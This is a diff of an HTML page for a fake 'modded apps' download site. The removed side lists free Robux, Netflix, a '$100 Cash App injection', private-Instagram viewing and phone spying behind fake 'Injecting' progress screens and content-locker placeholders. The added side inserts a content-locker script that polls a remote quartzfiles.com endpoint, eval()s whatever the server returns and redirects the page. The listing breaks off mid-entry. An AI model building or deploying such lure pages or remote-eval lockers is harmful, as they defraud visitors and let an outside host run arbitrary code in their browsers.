@@ -1,926 +1,959 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" style="height:100%;">			<head>
+				<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+								<meta name="viewport" content="width=device-width, initial-scale=1">
+								<meta name="googlebot" content="noindex">
+															<base href="//quartzfiles.com/">
+													
+				
+				<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+				<script type="text/javascript" src="https://quartzfiles.com/jquery.tipsy.js"></script>		
+									<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.0-rc1/css/bootstrap.min.css">
+					<link rel="stylesheet" href="//quartzfiles.com/bootstrap3/css/bootstrap-glyphicons.css">
+								<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+				<link rel="icon" href="/favicon.ico" type="image/x-icon">
+				<script language="JavaScript">
+					jQuery(function() {
+						jQuery('.tip_over_link').tipsy({offset: -3,gravity: 'n',fade: false,html: true,opacity: 0.95});
+					});
+				</script>
+				<script language="JavaScript">
+					var timed_function;
+					var has_been_closed = false;
+				
+										var first_click_ajax = false;
+					function Start_Ajax(){
+						redisplay_items = true;
+						clearTimeout(timed_function);
+						first_click_ajax = true;
+						jQuery('#offerlst').hide();
+						jQuery('#offerwait').show();
+												timed_function = setTimeout("chkld();",20000);
+											}
+					function Back_Ajax(){
+						jQuery('#offerwait').hide();
+						jQuery('#offerlst').fadeIn('slow');
+					}
+					function chkld(){
+						check_lead();
+					}
+					function completed(url){
+						forced_stop_check = true;
+						top.location = url;
+					}
 
+					var m_ext = '';
+					var c_ext = '';
+					var t_val = '';
+					var t_ext = '&t='+t_val;
+					var l_val = false;
+					
+					function check_lead(){
+						if (forced_stop_check == true) {
+														return;
+						}
+						t_ext = '&t='+t_val;
+						jQuery.ajax({
+							type: "POST",
+							crossDomain: true,
+							data: "a=2&a_t=0&lkt=3&lid=1237787&lid2=&p=296157"+m_ext+c_ext+t_ext,
+							url: "https://quartzfiles.com/common/ajax_check_url.php",
+							success: function(msg){
+								eval(msg);
+							}
+						});
+					}
+					
+					var box_text = "";
+					var dataCache = {};
+					var dref = 0;
+					
+					
+					function completion_notice(msg) {
+						alert(msg);
+					}
+					
+//dat encoding logic:
 
-<!-- Mirrored from ogapps.club/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Oct 2021 14:54:51 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
-<head>
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
-	<meta name="viewport" content="width=device-width, initial-scale=1"> 
-	<title>Download Apps</title>
-	<meta name="description" content="" />
-	<meta name="keywords" content="" />
-	<link rel="stylesheet" type="text/css" href="css/style.css" />
-	<link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
-	<link rel="stylesheet" type="text/css" href="css/all.min.css" />
-	<link href="css/css19b019b0.css?family=Open+Sans:300,400,600,700,800&amp;display=swap" rel="stylesheet" />
-</script>
-</head>
-<body>
-<div class="se-pre-con"></div>
-	<div class="modal fade" id="loadModal">
-		<div class="modal-dialog modal-sm modal-dialog-centered">
-			<div class="modal-load">
-				<p>Injecting<span class="blink">...</span></p>
-				<p class="console-log">Downloading</p>
-				<div class="progress">
-					<div class="progress-bar" style="width:00%"></div>
-				</div>
-			</div>
-		</div>
-	</div>
-	<div class="modal fade animate" id="appModal">
-		<div class="modal-dialog modal-dialog-centered">
-			<div class="modal-content animate-bottom">
-				<div class="modal-header">
-					<button type="button" class="close" data-dismiss="modal">&times;</button>
-					<div class="phone">
-						<div class="icon-modal">
-							<div class="avatar-modal"><img src="img/TLUFX0PV8IQMYF8F.jpg" alt="avatar" /></div>
-							<div class="name-modal" data-name="">Stevesnyderart</div>
-						</div>
-					</div>
-				</div>
-				<div class="modal-body">
-					<h1><font color="white">Injection required!</font></h1>
-					<p><font color="white">Follow the instructions on the next screen.</font></p>
-					<div class="modal-btn btn-injection">
-						<a>Start injection</a>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-	<div class="header">
-		<i class="fas fa-cloud-download-alt"></i>
-		<h1 class="ignitionText" style="
-    animation: move 2s linear infinite;
-    background-image: linear-gradient(to right, #fe8a71, #f6cd61, #3da4ab, #0e9aa7, #fe8a71);
-    background-size: 200% auto;
-    font-size: 40px;
-    font-weight: 700;
-    letter-spacing: 1px;
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-">GamingBoox
-</h1>
-	</div>
-	<div class="main">
-		<div class="search">
-			<input class="searchInput" type="text" placeholder="Search..." />
-		</div>
-		<div class="apps">
-			<ul class="app-section-content">
-
-				
-				<li class="searchApp" data-name="Among Us Mod.gz" data-app="Among Us Mod" data-url="https://realtoget.me/1cc9650">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/fJeWDXH.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AmongMod ltd</div>
-							<span class="app">Among Us MOD</span>
-							<div class="description">Imposter When You Want & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="AppleMusic.gz" data-name="AgentA.gz" data-app="Apple Music" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/93dc53e0d30a2362505484a84b364e20.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TweakApp ltd</div>
-							<span class="app">Apple Music</span>
-							<div class="description">Free Apple Music & Unlock All Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="AppStore++.gz" data-app="AppStore++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/7df4dca64ee63b40a33261c6ba04b85b.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TweakApp ltd</div>
-							<span class="app">AppStore++</span>
-							<div class="description">Get iOS Paid Apps For Free!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="AutoClicker.gz" data-app="Auto Clicker" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/alRhRj9.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInject Team</div>
-							<span class="app">Auto Clicker</span>
-							<div class="description">Auto Clicker For Any App!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Avakin Life++.gz" data-app="Avakin Life++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/rXM6GIh.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Avakin Life++</span>
-							<div class="description">Unlimited Avacoins, Gems & All Hidden Stuff</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Basketball Arena++.gz" data-app="Basketball Arena++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/hieOjQ1.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Basketball Arena++</span>
-							<div class="description">Unlimited Gold & Diamonds!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="Disney++.gz" data-app="Disney++" data-url="YOUR LOCKER HERE">
-					<a href="disneyplus/index.html">
-						<div class="avatar"><img class="app-img" src="img/z1wZnUN.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Disney Team</div>
-							<span class="app">Disney+</span>
-							<div class="description">Free Disney Plus</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-               
-				<li class="searchApp" data-name="Monopoly.gz" data-app="Monopoly" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/monopoly1.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Marmalade Game Studio Limited</div>
-							<span class="app">Monopoly</span>
-							<div class="description">Buy, sell and scheme your way to riches in MONOPOLY, the popular Hasbro...</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-
-				<li class="searchApp" data-name="Bloons Td 6.gz" data-app="Bloons Td 6" data-url="https://real4best.xyz/966ba33">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/Q1igcsk.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">DMods Team</div>
-							<span class="app">Bloons TD 6</span>
-							<div class="description">Free Download With Mods</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="GeometryDash.gz" data-app="GeometryDash" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/250px-Geometry_Dash_Logo.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Team Geometry</div>
-							<span class="app">Geometry Dash</span>
-							<div class="description">No Jailbreak or Root Required</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-
-				<li class="searchApp" data-name="Terraria.gz" data-app="Terraria" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/zXJTWRm.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">505 Games Srl</div>
-							<span class="app">Terraria</span>
-							<div class="description">DIG! FIGHT! EXPLORE! BUILD! Join the community of millions of Terrarians!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="TrueSkate.gz" data-app="TrueSkate" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/xfhI78Z.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">DMods Team</div>
-							<span class="app">True Skate</span>
-							<div class="description">Free Download With Mods Included</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-
-				<li class="searchApp" data-name="Call of Duty++.gz" data-app="Call of Duty++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/SYy5m7E.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">CODTeam</div>
-							<span class="app">Call of Duty++</span>
-							<div class="description">Unlimited COD Points & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="CarBridge.gz" data-app="CarBridge" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/7aQj7c0.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInject Team</div>
-							<span class="app">CarBridge</span>
-							<div class="description">No Jailbreak required & All Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Cash App++.gz" data-app="Cash App++++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/XcsxPAf.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInjects Team</div>
-							<span class="app">Cash App++</span>
-							<div class="description">100$ Injection - One per day!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Coin Master++.gz" data-app="Coin Master++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/kxOxfnY.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Coin Master++</span>
-							<div class="description">Free Spins and Coins & All Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="CrashOntheRun!++.gz" data-app="CrashOntheRun!++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/70VGWX7.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">CrashDev Team</div>
-							<span class="app">CrashOntheRun!++</span>
-							<div class="description">Unlimited Purple Crystals, Subscription Offers & More Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Cyberika++.gz" data-app="Cyberika++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/6FeVaxA.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">CyberDev Team</div>
-							<span class="app">Cyberika++</span>
-							<div class="description">Unlimited HyperKoins, Creds & More Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="DiscordNitro.gz" data-app="Discord Nitro" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/5MzUjS2.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInjects Team</div>
-							<span class="app">Discord Nitro</span>
-							<div class="description">Lifetime Premium Subscription!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="DLS 21 MOD.gz" data-app="DLS 21 MOD" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/OQEQG6w.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">DLS MOD Team</div>
-							<span class="app">DLS 21 MOD</span>
-							<div class="description">Unlimited Coins & Gems!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-					<li class="searchApp" data-name="eFootball PES 2021++.gz" data-name="AgentA.gz" data-app="eFootball PES 2021++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/U1j431V.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Arch Team</div>
-							<span class="app">eFootball PES 2021++</span>
-							<div class="description">Unlimited Coins, GP & More Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Episode++.gz" data-app="Episode++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/tdDWkzz.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInject Team</div>
-							<span class="app">Episode++</span>
-							<div class="description">Unlimited Passes & Gems!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="FIFA Mobile++.gz" data-app="FIFA Mobile++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/sTQ4Pce.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">FIFADev Team</div>
-							<span class="app">FIFA Mobile++</span>
-							<div class="description">Unlimited Coins & Points!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="Stardew Valley.gz" data-app="Stardew Valley++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/StardewValley.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Chucklefish</div>
-							<span class="app">Stardew Valley Full Download</span>
-							<div class="description">ConcernedApe's smash hit farming RPG comes to Mobile!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Fortnite.gz" data-app="Fortnite" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/seQZxNS.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">FRXMod ltd</div>
-							<span class="app">Fortnite</span>
-							<div class="description">Full Game for iOS & Android Devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="FR Legends++.gz" data-app="FR Legends++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/mE1vsOD.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInjects Team</div>
-							<span class="app">FR Legends++</span>
-							<div class="description">Unlimited Money & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="FridayNightFunkin.gz" data-app="Friday Night Funkin" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/apYjv3Q.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">FridayMod Ltd</div>
-							<span class="app">Friday Night Funkin</span>
-							<div class="description">iOS & Android Download!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Gacha Animator.gz" data-app="Gacha Animator" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/x7Pgb3o.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Gacha Animator</span>
-							<div class="description">Full Game for iOS & Android Devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="GTA 5.gz" data-app="GTA 5" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/QEmj3cc.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsMod Team</div>
-							<span class="app">GTA 5</span>
-							<div class="description">Full Game for iOS & Android Devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="HappyMod.gz" data-app="HappyMod" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/eeddQ4v.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">HappyMod Ltd</div>
-							<span class="app">HappyMod</span>
-							<div class="description">Modded Apps on iOS/Android! [No Jailbreak]</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="INDS.gz" data-app="INDS" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/0taCz6k.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">IndsMod Ltd</div>
-							<span class="app">INDS</span>
-							<div class="description">INDS Simulator on iOS & Android devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Insta Followers++.gz" data-app="Insta Followers++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/MPQlKLL.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">InstaMod Ltd</div>
-							<span class="app">Insta Followers++</span>
-							<div class="description">Free Followers!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="Audible++.gz" data-app="Audible++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/ojfemQ2.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Audible, Inc</div>
-							<span class="app">Audible++</span>
-							<div class="description">Get Free Audible Credits!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Instagram++.gz" data-app="Instagram++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/MPQlKLL.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">InstaMod Ltd</div>
-							<span class="app">Instagram++</span>
-							<div class="description">View Private Instagram Accounts Without Following Them!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="iSpy++.gz" data-app="iSpy" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/wqDQ7lm.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">iSpy</span>
-							<div class="description">Spy on Someones Phone!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="MAD FUT 21++.gz" data-name="MAD FUT 21++.gz" data-app="MAD FUT 21++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/jeJX5DJ.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">MadMod</div>
-							<span class="app">MAD FUT 21++</span>
-							<div class="description">Unlimited Packs, Coins, Cards & More Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="MHA: TSH++.gz" data-app="MHA: TSH++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/CozVs4e.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">MHA Team</div>
-							<span class="app">MHA: TSH++</span>
-							<div class="description">Unlimited Hero Coins, Elite Peacekeeping Pass & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="MinecraftPocketEdition.gz" data-app="Minecraft Pocket Edition" data-url="https://g4ming.cc/1da3dd7">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/Et2E8XJ.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">MineMod Ltd</div>
-							<span class="app">Minecraft Pocket Edition</span>
-							<div class="description">iOS & Android Download!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Mobile Legends++.gz" data-app="Mobile Legends++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/mobile.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInjects Team</div>
-							<span class="app">Mobile Legends++</span>
-							<div class="description">Unlimited Diamonds, Starlight Member & More Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="NBA2K21Arcade.gz" data-name="AgentA.gz" data-app="NBA2K21 Arcade" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/2LRfvLY.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">NBA2K21 Arcade</span>
-							<div class="description">iOS & Android Download For Free!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				
-				<li class="searchApp" data-name="Netflix.gz" data-app="Netflix" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/1b1c717c3f3fcd619aaa5ec5d23e07c2.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">NetflixMod Ltd</div>
-							<span class="app">Netflix</span>
-							<div class="description">Free Ultimate Premium & All Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="Garena Free Fire++.gz" data-app="Garena Free Fire++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/free_fire.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">LukasB</div>
-							<span class="app">Garena Free Fire</span>
-							<div class="description">Inject 33k Diamonds & Coins to your Garena Free Fire</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="No Limit 2++.gz" data-app="No Limit 2++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/z9r9276.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInjects Team</div>
-							<span class="app">No Limit 2++</span>
-							<div class="description">Unlimited Money & Gold and More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Offroad Outlaws++.gz" data-app="Offroad Outlaws++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/2bsBjdB.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">AppsInjects Team</div>
-							<span class="app">Offroad Outlaws++</span>
-							<div class="description">Unlimited Money & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="PandaHelper.gz" data-app="Panda Helper VIP" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/6VuBPm8.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">PandaHelper</span>
-							<div class="description">Panda Helper VIP Free Download for iOS Devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Patreon++.gz" data-app="Patreon++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/pV45kyf.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Patreon++</span>
-							<div class="description">Unlock ANY Patreon Content FOR FREE!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Play Together++.gz" data-app="Play Together++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/FPMM7bd.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Play Together</span>
-							<div class="description">Unlimited Gems, Packages & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Pokemon GO++.gz" data-app="Pokemon GO++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/sFNo5vL.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">PokeMod ltd</div>
-							<span class="app">Pokemon GO++</span>
-							<div class="description">Location Spoof, Quick Catch, Joystick & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="PS2 Emulator.gz" data-app="PS2 Emulator" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/347nHvD.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">PSMod ltd</div>
-							<span class="app">PS2 Emulator</span>
-							<div class="description">Download on iOS & Android Devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Roblox++.gz" data-name="AgentA.gz" data-app="Roblox++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/c69bcfff9e15db1936ca269c244b9624.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">RobloxMod Ltd</div>
-							<span class="app">Roblox++</span>
-							<div class="description">Unlimited Robux & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Rokkr.gz" data-app="Avatarify" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/o80NzBf.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">RokkrMod Ltd</div>
-							<span class="app">Rokkr</span>
-							<div class="description">Download Rokkr iOS App!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Score! Hero 2++.gz" data-name="AgentA.gz" data-app="Score! Hero 2++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/JhGQ8bL.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Score! Hero 2++</span>
-							<div class="description">Unlimited Bux, Energy and more features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Snapchat++.gz" data-name="AgentA.gz" data-app="Score! Hero 2++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/rioOwIH.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Snapchat++</span>
-							<div class="description">Modded Features on iOS & Android Devices!</div>
-						</div>
